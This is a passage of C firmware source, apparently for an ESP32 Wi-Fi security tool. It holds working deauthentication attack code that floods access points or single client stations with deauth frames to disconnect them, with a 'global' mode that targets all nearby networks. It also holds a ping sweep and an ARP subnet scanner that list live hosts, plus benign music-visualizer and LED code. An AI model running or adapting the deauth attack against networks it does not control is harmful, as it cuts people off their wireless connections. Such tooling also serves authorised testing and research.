        if (now - last_log >= 5000) {
            TERMINAL_VIEW_ADD_TEXT("%" PRIu32 " packets/sec\n", deauth_packets_sent/5);
            printf("%" PRIu32 " packets/sec\n", deauth_packets_sent/5); 
            deauth_packets_sent = 0;
            last_log = now;
        }

    }
}

void wifi_manager_start_deauth() {
    if (!beacon_task_running) {
        ap_manager_stop_services();
        esp_wifi_start();
        printf("Restarting Wi-Fi\n");
#ifdef CONFIG_WITH_STATUS_DISPLAY
        status_display_show_attack("Deauth", "starting");
#endif
        
        if (selected_ap_count > 0 && selected_aps != NULL) {
            printf("Starting deauth attack on %d selected APs:\n", selected_ap_count);
            TERMINAL_VIEW_ADD_TEXT("Starting deauth attack on %d selected APs:\n", selected_ap_count);
            
            for (int i = 0; i < selected_ap_count; i++) {
                char sanitized_ssid[33];
                sanitize_ssid_and_check_hidden(selected_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));
                printf("  [%d] %s (%02X:%02X:%02X:%02X:%02X:%02X)\n", 
                       i, sanitized_ssid,
                       selected_aps[i].bssid[0], selected_aps[i].bssid[1], selected_aps[i].bssid[2],
                       selected_aps[i].bssid[3], selected_aps[i].bssid[4], selected_aps[i].bssid[5]);
                TERMINAL_VIEW_ADD_TEXT("  [%d] %s\n", i, sanitized_ssid);
#ifdef CONFIG_WITH_STATUS_DISPLAY
                if (i == 0) {
                    status_display_show_attack("Deauth", sanitized_ssid);
                }
#endif
            }
        } else if (strlen((const char *)selected_ap.ssid) > 0) {
            char sanitized_ssid[33];
            sanitize_ssid_and_check_hidden(selected_ap.ssid, sanitized_ssid, sizeof(sanitized_ssid));
            printf("Starting deauth attack on selected AP: %s\n", sanitized_ssid);
            TERMINAL_VIEW_ADD_TEXT("Starting deauth attack on selected AP: %s\n", sanitized_ssid);
#ifdef CONFIG_WITH_STATUS_DISPLAY
            status_display_show_attack("Deauth", sanitized_ssid);
#endif
        } else {
            printf("Starting global deauth attack on all APs\n");
            TERMINAL_VIEW_ADD_TEXT("Starting global deauth attack on all APs\n");
#ifdef CONFIG_WITH_STATUS_DISPLAY
            status_display_show_attack("Deauth", "all APs");
#endif
        }
        
        xTaskCreate(wifi_deauth_task, "deauth_task", 4096, NULL, 5, &deauth_task_handle);
        beacon_task_running = true;
        rgb_manager_set_color(&rgb_manager, -1, 255, 0, 0, false);
    } else {
        printf("Deauth already running.\n");
        TERMINAL_VIEW_ADD_TEXT("Deauth already running.\n");
    }
}
void wifi_manager_select_ap(int index) {

    if (ap_count == 0) {
        printf("No access points found\n");
        TERMINAL_VIEW_ADD_TEXT("No access points found\n");
        return;
    }

    if (scanned_aps == NULL) {
        printf("No AP info available (scanned_aps is NULL)\n");
        TERMINAL_VIEW_ADD_TEXT("No AP info available (scanned_aps is NULL)\n");
        return;
    }

    if (index < 0 || index >= ap_count) {
        printf("Invalid index: %d. Index should be between 0 and %d\n", index, ap_count - 1);
        TERMINAL_VIEW_ADD_TEXT("Invalid index: %d. Index should be between 0 and %d\n", index,
                               ap_count - 1);
        return;
    }

    selected_ap = scanned_aps[index];

    if (selected_aps != NULL) {
        free(selected_aps);
        selected_aps = NULL;
    }

    selected_aps = malloc(sizeof(wifi_ap_record_t));
    if (selected_aps != NULL) {
        selected_aps[0] = selected_ap;
        selected_ap_count = 1;
    } else {
        selected_ap_count = 0;
    }

    char sanitized_ssid[33];
    sanitize_ssid_and_check_hidden(selected_ap.ssid, sanitized_ssid, sizeof(sanitized_ssid));

    printf("Selected Access Point: SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
           sanitized_ssid, selected_ap.bssid[0], selected_ap.bssid[1], selected_ap.bssid[2],
           selected_ap.bssid[3], selected_ap.bssid[4], selected_ap.bssid[5]);

    TERMINAL_VIEW_ADD_TEXT(
        "Selected Access Point: SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n", sanitized_ssid,
        selected_ap.bssid[0], selected_ap.bssid[1], selected_ap.bssid[2], selected_ap.bssid[3],
        selected_ap.bssid[4], selected_ap.bssid[5]);

    printf("Selected Access Point Successfully\n");
    TERMINAL_VIEW_ADD_TEXT("Selected Access Point Successfully\n");
}

void wifi_manager_select_multiple_aps(int *indices, int count) {
    if (ap_count == 0) {
        printf("No access points found\n");
        TERMINAL_VIEW_ADD_TEXT("No access points found\n");
        return;
    }

    if (scanned_aps == NULL) {
        printf("No AP info available (scanned_aps is NULL)\n");
        TERMINAL_VIEW_ADD_TEXT("No AP info available (scanned_aps is NULL)\n");
        return;
    }

    if (count <= 0) {
        printf("Invalid count: %d\n", count);
        TERMINAL_VIEW_ADD_TEXT("Invalid count: %d\n", count);
        return;
    }

    for (int i = 0; i < count; i++) {
        if (indices[i] < 0 || indices[i] >= ap_count) {
            printf("Invalid index: %d. Index should be between 0 and %d\n", indices[i], ap_count - 1);
            TERMINAL_VIEW_ADD_TEXT("Invalid index: %d. Index should be between 0 and %d\n", indices[i], ap_count - 1);
            return;
        }
    }

    if (selected_aps != NULL) {
        free(selected_aps);
        selected_aps = NULL;
    }

    selected_aps = malloc(count * sizeof(wifi_ap_record_t));
    if (selected_aps == NULL) {
        printf("Failed to allocate memory for selected APs\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to allocate memory for selected APs\n");
        selected_ap_count = 0;
        return;
    }

    selected_ap_count = count;

    for (int i = 0; i < count; i++) {
        selected_aps[i] = scanned_aps[indices[i]];
    }

    selected_ap = selected_aps[0];

    printf("Selected %d Access Points:\n", count);
    TERMINAL_VIEW_ADD_TEXT("Selected %d Access Points:\n", count);

    for (int i = 0; i < count; i++) {
        char sanitized_ssid[33];
        sanitize_ssid_and_check_hidden(selected_aps[i].ssid, sanitized_ssid, sizeof(sanitized_ssid));

        printf("[%d] SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X%s\n",
               i, sanitized_ssid,
               selected_aps[i].bssid[0], selected_aps[i].bssid[1], selected_aps[i].bssid[2],
               selected_aps[i].bssid[3], selected_aps[i].bssid[4], selected_aps[i].bssid[5],
               (i == 0) ? " (Primary)" : "");

        TERMINAL_VIEW_ADD_TEXT("[%d] SSID: %s, BSSID: %02X:%02X:%02X:%02X:%02X:%02X%s\n",
               i, sanitized_ssid,
               selected_aps[i].bssid[0], selected_aps[i].bssid[1], selected_aps[i].bssid[2],
               selected_aps[i].bssid[3], selected_aps[i].bssid[4], selected_aps[i].bssid[5],
               (i == 0) ? " (Primary)" : "");
    }

    printf("Multiple APs selected successfully. Primary AP: %s\n", 
           (char*)selected_ap.ssid);
    TERMINAL_VIEW_ADD_TEXT("Multiple APs selected successfully.\n");
}

void wifi_manager_get_selected_aps(wifi_ap_record_t **aps, int *count) {
    if (aps != NULL) {
        *aps = selected_aps;
    }
    if (count != NULL) {
        *count = selected_ap_count;
    }
}

void wifi_manager_select_station(int index) {
    if (station_count == 0) {
        printf("No stations found.\n");
        TERMINAL_VIEW_ADD_TEXT("No stations found.\n");
        return;
    }
    if (index < 0 || index >= station_count) {
        printf("Invalid station index: %d. Index should be between 0 and %d\n", index, station_count - 1);
        TERMINAL_VIEW_ADD_TEXT("Invalid station index: %d. Index should be between 0 and %d\n", index, station_count - 1);
        return;
    }
    selected_station = station_ap_list[index];
    char ssid_str[33];
    char sanitized_ssid[33];
    for (int i = 0; i < ap_count; i++) {
        if (memcmp(scanned_aps[i].bssid, selected_station.ap_bssid, 6) == 0) {
            memcpy(ssid_str, scanned_aps[i].ssid, 32);
            ssid_str[32] = '\0';
            int len = strlen(ssid_str);
            for (int j = 0; j < len; j++) {
                char c = ssid_str[j];
                sanitized_ssid[j] = (c >= 32 && c <= 126) ? c : '.';
            }
            sanitized_ssid[len] = '\0';
            break;
        }
    }
    printf("Selected Station %d: Station MAC: %02X:%02X:%02X:%02X:%02X:%02X\n    -> AP SSID: %s\n    -> AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
           index,
           selected_station.station_mac[0], selected_station.station_mac[1], selected_station.station_mac[2],
           selected_station.station_mac[3], selected_station.station_mac[4], selected_station.station_mac[5],
           sanitized_ssid,
           selected_station.ap_bssid[0], selected_station.ap_bssid[1], selected_station.ap_bssid[2],
           selected_station.ap_bssid[3], selected_station.ap_bssid[4], selected_station.ap_bssid[5]);
    TERMINAL_VIEW_ADD_TEXT("Selected Station %d: Station MAC: %02X:%02X:%02X:%02X:%02X:%02X\n    -> AP SSID: %s\n    -> AP BSSID: %02X:%02X:%02X:%02X:%02X:%02X\n",
           index,
           selected_station.station_mac[0], selected_station.station_mac[1], selected_station.station_mac[2],
           selected_station.station_mac[3], selected_station.station_mac[4], selected_station.station_mac[5],
           sanitized_ssid,
           selected_station.ap_bssid[0], selected_station.ap_bssid[1], selected_station.ap_bssid[2],
           selected_station.ap_bssid[3], selected_station.ap_bssid[4], selected_station.ap_bssid[5]);
    station_selected = true;
}

void wifi_manager_deauth_station(void) {
    if (!station_selected) {
        wifi_manager_start_deauth();
        return;
    }
    if (deauth_station_task_handle) {
        printf("Station deauth already running.\n");
        return;
    }
    ap_manager_stop_services(); // stop AP and HTTP server
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP)); // switch to AP mode for deauth
    ESP_ERROR_CHECK(esp_wifi_start()); // restart Wi-Fi interface without HTTP server
    printf("Deauthing station %02X:%02X:%02X:%02X:%02X:%02X from AP %02X:%02X:%02X:%02X:%02X:%02X, starting background task...\n",
           selected_station.station_mac[0], selected_station.station_mac[1], selected_station.station_mac[2], selected_station.station_mac[3], selected_station.station_mac[4], selected_station.station_mac[5],
           selected_station.ap_bssid[0], selected_station.ap_bssid[1], selected_station.ap_bssid[2], selected_station.ap_bssid[3], selected_station.ap_bssid[4], selected_station.ap_bssid[5]);
    TERMINAL_VIEW_ADD_TEXT("Deauthing station %02X:%02X:%02X:%02X:%02X:%02X from AP %02X:%02X:%02X:%02X:%02X:%02X, starting background task...\n",
           selected_station.station_mac[0], selected_station.station_mac[1], selected_station.station_mac[2], selected_station.station_mac[3], selected_station.station_mac[4], selected_station.station_mac[5],
           selected_station.ap_bssid[0], selected_station.ap_bssid[1], selected_station.ap_bssid[2], selected_station.ap_bssid[3], selected_station.ap_bssid[4], selected_station.ap_bssid[5]);
    xTaskCreate(wifi_deauth_station_task, "deauth_station", 4096, NULL, 5, &deauth_station_task_handle);
    station_selected = false;
}

// Background task for deauthenticating a selected station and logging packet rate
static void wifi_deauth_station_task(void *param) {
    int deauth_channel = 1;
    wifi_second_chan_t second_chan;
    esp_err_t ch_err = esp_wifi_get_channel(&deauth_channel, &second_chan);
    if (ch_err != ESP_OK || deauth_channel < 1 || deauth_channel > SCANSTA_MAX_WIFI_CHANNEL) {
        deauth_channel = 1; // fallback channel
    }
    (void)esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
    uint32_t last_log = xTaskGetTickCount() * portTICK_PERIOD_MS;
    for (;;) {
        wifi_manager_broadcast_deauth(selected_station.ap_bssid, deauth_channel, selected_station.station_mac);
        vTaskDelay(pdMS_TO_TICKS(50));
        uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
        if (now - last_log >= 5000) {
            printf("%" PRIu32 " packets/sec\n", deauth_packets_sent / 5);
            TERMINAL_VIEW_ADD_TEXT("%" PRIu32 " packets/sec\n", deauth_packets_sent / 5);
            deauth_packets_sent = 0;
            last_log = now;
        }
    }
}

#define MAX_PAYLOAD 64
#define UDP_PORT 6677
#define TRACK_NAME_LEN 32
#define ARTIST_NAME_LEN 32
#define NUM_BARS 15

void screen_music_visualizer_task(void *pvParameters) {
    char rx_buffer[128];
    char track_name[TRACK_NAME_LEN + 1];
    char artist_name[ARTIST_NAME_LEN + 1];
    uint8_t amplitudes[NUM_BARS];

    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(UDP_PORT);
    dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);

    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        printf("Unable to create socket: errno %d\n", errno);
        vTaskDelete(NULL);
        return;
    }

    printf("Socket created\n");

    int err = bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    if (err < 0) {
        printf("Socket unable to bind: errno %d\n", errno);
        close(sock);
        vTaskDelete(NULL);
        return;
    }

    printf("Socket bound, port %d\n", UDP_PORT);

    while (1) {
        printf("Waiting for data...\n");

        struct sockaddr_in6 source_addr;
        socklen_t socklen = sizeof(source_addr);

        int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, 0,
                           (struct sockaddr *)&source_addr, &socklen);
        if (len < 0) {
            printf("recvfrom failed: errno %d\n", errno);
            break;
        }

        rx_buffer[len] = '\0';

        if (len >= TRACK_NAME_LEN + ARTIST_NAME_LEN + NUM_BARS) {

            memcpy(track_name, rx_buffer, TRACK_NAME_LEN);
            track_name[TRACK_NAME_LEN] = '\0';

            memcpy(artist_name, rx_buffer + TRACK_NAME_LEN, ARTIST_NAME_LEN);
            artist_name[ARTIST_NAME_LEN] = '\0';

            memcpy(amplitudes, rx_buffer + TRACK_NAME_LEN + ARTIST_NAME_LEN, NUM_BARS);

#ifdef WITH_SCREEN
            music_visualizer_view_update(amplitudes, track_name, artist_name);
#endif
        } else {
            printf("Received packet of unexpected size\n");
        }
    }

    if (sock != -1) {
        printf("Shutting down socket and restarting...\n");
        shutdown(sock, 0);
        close(sock);
    }

    vTaskDelete(NULL);
}
void animate_led_based_on_amplitude(void *pvParameters) {
    char rx_buffer[128];
    char addr_str[128];
    int addr_family = AF_INET;
    int ip_protocol = IPPROTO_IP;
    struct sockaddr_in dest_addr;

    dest_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    dest_addr.sin_family = addr_family;
    dest_addr.sin_port = htons(UDP_PORT);

    int sock = socket(addr_family, SOCK_DGRAM, ip_protocol);
    if (sock < 0) {
        printf("Unable to create socket: errno %d\n", errno);
        return;
    }
    printf("Socket created\n");

    if (bind(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
        printf("Socket unable to bind: errno %d\n", errno);
        close(sock);
        return;
    }
    printf("Socket bound, port %d\n", UDP_PORT);

    float amplitude = 0.0f;
    float last_amplitude = 0.0f;
    float smoothing_factor = 0.1f;
    int hue = 0;
    
    uint32_t last_error_time = 0;
    const uint32_t error_rate_limit_ms = 5000;

    while (1) {
        struct sockaddr_in source_addr;
        socklen_t socklen = sizeof(source_addr);
        int len = recvfrom(sock, rx_buffer, sizeof(rx_buffer) - 1, MSG_DONTWAIT,
                           (struct sockaddr *)&source_addr, &socklen);

        if (len > 0) {
            rx_buffer[len] = '\0';
            inet_ntoa_r(source_addr.sin_addr, addr_str, sizeof(addr_str) - 1);
            printf("Received %d bytes from %s: %s\n", len, addr_str, rx_buffer);

            amplitude = atof(rx_buffer);
            amplitude = fmaxf(0.0f, fminf(amplitude, 1.0f)); // Clamp between 0.0 and 1.0

            // Smooth amplitude to avoid sudden changes (optional)
            amplitude =
                (smoothing_factor * amplitude) + ((1.0f - smoothing_factor) * last_amplitude);
            last_amplitude = amplitude;
        } else {
            // Gradually decrease amplitude when no data is received
            amplitude = last_amplitude * 0.9f; // Adjust decay rate as needed
            last_amplitude = amplitude;
        }

        // Ensure amplitude doesn't go below zero
        amplitude = fmaxf(0.0f, amplitude);

        hue = (int)(amplitude * 360) % 360;

        float h = hue / 60.0f;
        float s = 1.0f;
        float v = amplitude;

        int i = (int)h % 6;
        float f = h - (int)h;
        float p = v * (1.0f - s);
        float q = v * (1.0f - f * s);
        float t = v * (1.0f - (1.0f - f) * s);

        float r = 0.0f, g = 0.0f, b = 0.0f;
        switch (i) {
        case 0:
            r = v;
            g = t;
            b = p;
            break;
        case 1:
            r = q;
            g = v;
            b = p;
            break;
        case 2:
            r = p;
            g = v;
            b = t;
            break;
        case 3:
            r = p;
            g = q;
            b = v;
            break;
        case 4:
            r = t;
            g = p;
            b = v;
            break;
        case 5:
            r = v;
            g = p;
            b = q;
            break;
        }

        uint8_t red = (uint8_t)(r * 255);
        uint8_t green = (uint8_t)(g * 255);
        uint8_t blue = (uint8_t)(b * 255);

        esp_err_t ret = rgb_manager_set_color(&rgb_manager, 0, red, green, blue, false);
        if (ret != ESP_OK) {
            printf("Failed to set color\n");
        }

        vTaskDelay(10 / portTICK_PERIOD_MS);
    }

    if (sock != -1) {
        printf("Shutting down socket...\n");
        shutdown(sock, 0);
        close(sock);
    }
}

#define START_HOST 1
#define END_HOST 254
#define SCAN_TIMEOUT_MS 100
#define HOST_TIMEOUT_MS 100
#define WIFI_CONNECTED_BIT BIT0
#define WIFI_FAIL_BIT BIT1
#define MAX_OPEN_PORTS 64

uint16_t calculate_checksum(uint16_t *addr, int len) {
    int nleft = len;
    uint32_t sum = 0;
    uint16_t *w = addr;
    uint16_t answer = 0;

    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    if (nleft == 1) {
        *(unsigned char *)(&answer) = *(unsigned char *)w;
        sum += answer;
    }

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}

bool get_subnet_prefix(scanner_ctx_t *ctx) {
    esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!netif) {
        printf("Failed to get WiFi interface\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to get WiFi interface\n");
        return false;
    }

    // Check if WiFi is connected
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
        printf("WiFi is not connected\n");
        TERMINAL_VIEW_ADD_TEXT("WiFi is not connected\n");
        return false;
    }

    // Get IP info
    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(netif, &ip_info) != ESP_OK) {
        printf("Failed to get IP info\n");
        TERMINAL_VIEW_ADD_TEXT("Failed to get IP info\n");
        return false;
    }

    uint32_t network = ip_info.ip.addr & ip_info.netmask.addr;
    struct in_addr network_addr;
    network_addr.s_addr = network;

    char *network_str = inet_ntoa(network_addr);
    char *last_dot = strrchr(network_str, '.');
    if (last_dot == NULL) {
        printf("Invalid network address format\n");
        TERMINAL_VIEW_ADD_TEXT("Invalid network address format\n");
        return false;
    }

    size_t prefix_len = last_dot - network_str + 1;
    memcpy(ctx->subnet_prefix, network_str, prefix_len);
    ctx->subnet_prefix[prefix_len] = '\0';

    printf("Determined subnet prefix: %s\n", ctx->subnet_prefix);
    TERMINAL_VIEW_ADD_TEXT("Determined subnet prefix: %s\n", ctx->subnet_prefix);
    return true;
}

bool is_host_active(const char *ip_addr) {
    struct sockaddr_in addr;
    int sock;
    struct timeval timeout;
    fd_set readset;
    uint8_t buf[sizeof(icmp_packet_t)];
    bool is_active = false;

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0)
        return false;

    // Prepare ICMP packet
    icmp_packet_t *icmp = (icmp_packet_t *)buf;
    icmp->type = 8; // ICMP Echo Request
    icmp->code = 0;
    icmp->checksum = 0;
    icmp->id = 0xAFAF;
    icmp->seqno = htons(1);
    
    uint16_t aligned_buf[(sizeof(icmp_packet_t) + 1) / 2];
    memcpy(aligned_buf, icmp, sizeof(icmp_packet_t));
    icmp->checksum = calculate_checksum(aligned_buf, sizeof(icmp_packet_t));

    addr.sin_family = AF_INET;
    inet_pton(AF_INET, ip_addr, &addr.sin_addr.s_addr);

    sendto(sock, buf, sizeof(icmp_packet_t), 0, (struct sockaddr *)&addr, sizeof(addr));

    timeout.tv_sec = HOST_TIMEOUT_MS / 1000;
    timeout.tv_usec = (HOST_TIMEOUT_MS % 1000) * 1000;

    FD_ZERO(&readset);
    FD_SET(sock, &readset);

    if (select(sock + 1, &readset, NULL, NULL, &timeout) > 0) {
        is_active = true;
    }

    close(sock);
    return is_active;
}

scanner_ctx_t *scanner_init(void) {
    scanner_ctx_t *ctx = malloc(sizeof(scanner_ctx_t));
    if (!ctx)
        return NULL;

    ctx->results = malloc(sizeof(host_result_t) * END_HOST);
    if (!ctx->results) {
        free(ctx);
        return NULL;
    }

    ctx->max_results = END_HOST;
    ctx->num_active_hosts = 0;
    ctx->subnet_prefix[0] = '\0';

    return ctx;
}

arp_scanner_ctx_t *arp_scanner_init(void) {
    arp_scanner_ctx_t *ctx = malloc(sizeof(arp_scanner_ctx_t));
    if (!ctx) {
        return NULL;
    }

    ctx->max_hosts = END_HOST - START_HOST + 1;
    ctx->hosts = malloc(sizeof(arp_host_t) * ctx->max_hosts);
    if (!ctx->hosts) {
        free(ctx);
        return NULL;
    }

    ctx->num_active_hosts = 0;
    memset(ctx->subnet_prefix, 0, sizeof(ctx->subnet_prefix));
    return ctx;
}

void arp_scanner_cleanup(arp_scanner_ctx_t *ctx) {
    if (ctx) {
        if (ctx->hosts) {
            free(ctx->hosts);
        }
        free(ctx);
    }
}

bool send_arp_request(const char *target_ip) {
    if (!target_ip) {
        ESP_LOGW(TAG, "send_arp_request: target_ip is NULL");
        return false;
    }

    ESP_LOGD(TAG, "Sending ARP request to %s", target_ip);
    
    esp_netif_t *netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!netif) {
        ESP_LOGW(TAG, "send_arp_request: Failed to get WiFi STA interface");
        return false;
    }

    // Get our own IP and MAC
    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(netif, &ip_info) != ESP_OK) {
        return false;
    }

    uint8_t our_mac[6];
    if (esp_netif_get_mac(netif, our_mac) != ESP_OK) {
        return false;
    }

    // Parse target IP
    esp_ip4_addr_t target_addr;
    if (inet_pton(AF_INET, target_ip, &target_addr) != 1) {
        return false;
    }
    // Create ARP request packet
    uint8_t arp_packet[42] = {
        // Ethernet header
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination MAC (broadcast)
        our_mac[0], our_mac[1], our_mac[2], our_mac[3], our_mac[4], our_mac[5], // Source MAC
        0x08, 0x06, // EtherType (ARP)
        
        // ARP header
        0x00, 0x01, // Hardware type (Ethernet)
        0x08, 0x00, // Protocol type (IPv4)
        0x06,       // Hardware address length
        0x04,       // Protocol address length
        0x00, 0x01, // Operation (ARP request)
        
        // Sender hardware address (our MAC)
        our_mac[0], our_mac[1], our_mac[2], our_mac[3], our_mac[4], our_mac[5],
        
        // Sender protocol address (our IP)
        (ip_info.ip.addr >> 0) & 0xFF,
        (ip_info.ip.addr >> 8) & 0xFF,
        (ip_info.ip.addr >> 16) & 0xFF,
        (ip_info.ip.addr >> 24) & 0xFF,
        
        // Target hardware address (unknown, all zeros)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        
        // Target protocol address (target IP)
        (target_addr.addr >> 0) & 0xFF,
        (target_addr.addr >> 8) & 0xFF,
        (target_addr.addr >> 16) & 0xFF,
        (target_addr.addr >> 24) & 0xFF
    };

    // Send raw ARP packet using esp_wifi_80211_tx with retry logic
    ESP_LOGD(TAG, "Sending ARP packet to %s via esp_wifi_80211_tx", target_ip);
    
    esp_err_t err = ESP_FAIL;
    int retry_count = 0;
    const int max_retries = 3;
    
    while (retry_count < max_retries) {
        err = esp_wifi_80211_tx(WIFI_IF_STA, arp_packet, sizeof(arp_packet), false);
        
        if (err == ESP_OK) {
            ESP_LOGD(TAG, "ARP packet sent successfully to %s", target_ip);
            return true;
        } else if (err == ESP_ERR_NO_MEM) {
            // WiFi buffer exhaustion - wait and retry
            retry_count++;
            ESP_LOGD(TAG, "WiFi buffer full for %s, retry %d/%d", target_ip, retry_count, max_retries);
            vTaskDelay(pdMS_TO_TICKS(10)); // Wait 10ms before retry
        } else {
            // Other error - don't retry
            ESP_LOGW(TAG, "Failed to send ARP packet to %s: %s", target_ip, esp_err_to_name(err));
            break;
        }
    }
    
    if (err == ESP_ERR_NO_MEM) {
        ESP_LOGW(TAG, "Failed to send ARP packet to %s after %d retries: WiFi buffers exhausted", target_ip, max_retries);
    }
    
    return false;
}

// Alternative ARP resolution using ICMP ping to trigger ARP
bool trigger_arp_via_ping(const char *ip) {
    struct sockaddr_in dest_addr;
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(ip);
    
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
    if (sock < 0) {
        // Try UDP socket as fallback
        sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (sock < 0) {
            return false;
        }
        dest_addr.sin_port = htons(53); // DNS port
        
        // Set non-blocking and short timeout
        int flags = fcntl(sock, F_GETFL, 0);
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
        
        // Try to connect to trigger ARP resolution
        connect(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        close(sock);
        return true;
    }
    
    close(sock);
    return true;
}

bool send_arp_request_lwip(const char *target_ip) {
    if (!target_ip) {
        return false;
    }

    // Parse target IP
    ip4_addr_t target_addr;
    if (!ip4addr_aton(target_ip, &target_addr)) {
        return false;
    }

    // Get STA network interface
    struct netif *netif = netif_default;
    if (!netif) {
        ESP_LOGW(TAG, "netif_default is NULL");
        return false;
    }

    // Send ARP request using lwIP
    err_t result = etharp_request(netif, &target_addr);
    return (result == ERR_OK);
}

bool get_arp_table_entry(const char *ip, uint8_t *mac) {
    if (!ip || !mac) {
        return false;
    }

    // Parse target IP
    ip4_addr_t target_addr;
    if (!ip4addr_aton(ip, &target_addr)) {
        return false;
    }

    // Search ARP table using NULL netif (searches all interfaces)
    struct eth_addr *eth_ret = NULL;
    const ip4_addr_t *ip_ret = NULL;
    
    s8_t arp_idx = etharp_find_addr(NULL, &target_addr, &eth_ret, &ip_ret);
    if (arp_idx >= 0 && eth_ret) {
        memcpy(mac, eth_ret->addr, 6);
        return true;
    }

    return false;
}
bool wifi_manager_arp_scan_subnet(void) {
    arp_scanner_ctx_t *ctx = arp_scanner_init();
    if (!ctx) {
        TERMINAL_VIEW_ADD_TEXT("Failed to initialize ARP scanner context\n");
        return false;
    }

    // Get subnet information using existing function
    scanner_ctx_t temp_ctx;
    if (!get_subnet_prefix(&temp_ctx)) {
        TERMINAL_VIEW_ADD_TEXT("Failed to get network information. Make sure WiFi is connected.\n");
        arp_scanner_cleanup(ctx);
        return false;
    }

    strncpy(ctx->subnet_prefix, temp_ctx.subnet_prefix, sizeof(ctx->subnet_prefix) - 1);

    char scan_msg[64];
    snprintf(scan_msg, sizeof(scan_msg), "Starting ARP scan on %s0/24\n", ctx->subnet_prefix);
    TERMINAL_VIEW_ADD_TEXT(scan_msg);

    TERMINAL_VIEW_ADD_TEXT("Scanning network using ARP requests...\n");
    printf("Starting ARP scan on %s1-%d\n", ctx->subnet_prefix, END_HOST);
    ESP_LOGI(TAG, "Starting ARP scan, scanning %s1-%d", ctx->subnet_prefix, END_HOST);
    
    ctx->num_active_hosts = 0;
    const int batch_size = 10;
    
    for (int batch_start = START_HOST; batch_start <= END_HOST; batch_start += batch_size) {
        int batch_end = (batch_start + batch_size - 1 > END_HOST) ? END_HOST : batch_start + batch_size - 1;
        
        // Progress update
        char progress_msg[64];
        snprintf(progress_msg, sizeof(progress_msg), "Scanning %s%d-%d...\n", ctx->subnet_prefix, batch_start, batch_end);
        TERMINAL_VIEW_ADD_TEXT(progress_msg);
        printf("Scanning %s%d-%d...\n", ctx->subnet_prefix, batch_start, batch_end);
        
        ESP_LOGI(TAG, "Sending ARP batch %d-%d", batch_start, batch_end);
        
        // Send batch of ARP requests using lwIP
        for (int host = batch_start; host <= batch_end; host++) {
            char current_ip[26];
            snprintf(current_ip, sizeof(current_ip), "%s%d", ctx->subnet_prefix, host);
            
            send_arp_request_lwip(current_ip);
            vTaskDelay(pdMS_TO_TICKS(10)); // Small delay between requests
        }
        
        // Wait for responses to arrive
        vTaskDelay(pdMS_TO_TICKS(250));
        
        // Check ARP table for this batch
        for (int host = batch_start; host <= batch_end; host++) {
            char current_ip[26];
            snprintf(current_ip, sizeof(current_ip), "%s%d", ctx->subnet_prefix, host);
            
            uint8_t mac[6];
            if (get_arp_table_entry(current_ip, mac)) {
                if (ctx->num_active_hosts < ctx->max_hosts) {
                    strncpy(ctx->hosts[ctx->num_active_hosts].ip, current_ip, sizeof(ctx->hosts[ctx->num_active_hosts].ip) - 1);
                    memcpy(ctx->hosts[ctx->num_active_hosts].mac, mac, 6);
                    ctx->hosts[ctx->num_active_hosts].is_active = true;
                    ctx->num_active_hosts++;


                }
            }
        }
        
        // Progress update every 5 batches or at end
        if ((batch_end - START_HOST + 1) % 50 == 0 || batch_end == END_HOST) {
            char status_msg[64];
            snprintf(status_msg, sizeof(status_msg), "Progress: %d/%d scanned, %zu hosts found\n", 
                    batch_end - START_HOST + 1, END_HOST - START_HOST + 1, ctx->num_active_hosts);
            TERMINAL_VIEW_ADD_TEXT(status_msg);
            printf("Progress: %d/%d scanned, %zu hosts found\n", 
                    batch_end - START_HOST + 1, END_HOST - START_HOST + 1, ctx->num_active_hosts);
            ESP_LOGI(TAG, "Progress: %d/%d, found %zu hosts so far", 
                    batch_end - START_HOST + 1, END_HOST - START_HOST + 1, ctx->num_active_hosts);
        }
    }

    // Final summary
    TERMINAL_VIEW_ADD_TEXT("\n=== ARP Scan Results ===\n");
    printf("\n=== ARP Scan Results ===\n");
    
    char result_msg[64];
    snprintf(result_msg, sizeof(result_msg), "Found %zu active hosts on %s0/24:\n", ctx->num_active_hosts, ctx->subnet_prefix);
    TERMINAL_VIEW_ADD_TEXT(result_msg);
    printf("Found %zu active hosts on %s0/24:\n", ctx->num_active_hosts, ctx->subnet_prefix);
    
    if (ctx->num_active_hosts > 0) {
        TERMINAL_VIEW_ADD_TEXT("\nActive hosts:\n");
        printf("\nActive hosts:\n");
        
        for (size_t i = 0; i < ctx->num_active_hosts; i++) {
